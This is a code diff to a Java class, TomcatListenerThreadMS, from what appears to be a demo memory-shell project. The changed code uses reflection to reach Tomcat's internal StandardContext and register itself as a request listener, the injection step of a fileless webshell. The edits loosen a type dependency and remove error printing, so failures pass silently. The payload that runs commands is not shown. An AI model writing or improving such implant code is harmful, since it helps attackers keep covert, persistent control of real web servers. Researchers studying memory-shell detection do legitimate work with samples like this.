@@ -1,6 +1,5 @@
 package com.demo.memshell;
 
-import javax.servlet.ServletContext;
 import javax.servlet.ServletRequestEvent;
 import javax.servlet.ServletRequestListener;
 import javax.servlet.http.HttpServletRequest;
@@ -64,7 +63,7 @@ public class TomcatListenerThreadMS implements ServletRequestListener {
              */
             Object standardContext;
             try {
-                ServletContext servletContext = (ServletContext) request.getClass().getDeclaredMethod("getServletContext").invoke(request);
+                Object servletContext = request.getClass().getDeclaredMethod("getServletContext").invoke(request);
                 Object applicationContext = getFieldValue(servletContext, "context");
                 standardContext = getFieldValue(applicationContext, "context");
             } catch (NoSuchMethodException e) {
@@ -73,9 +72,7 @@ public class TomcatListenerThreadMS implements ServletRequestListener {
             TomcatListenerThreadMS listenerMemShell = new TomcatListenerThreadMS();
             standardContext.getClass().getMethod("addApplicationEventListener", Object.class).invoke(standardContext, listenerMemShell);
 
-
         } catch (Exception e) {
-            e.printStackTrace();
         }
     }
 
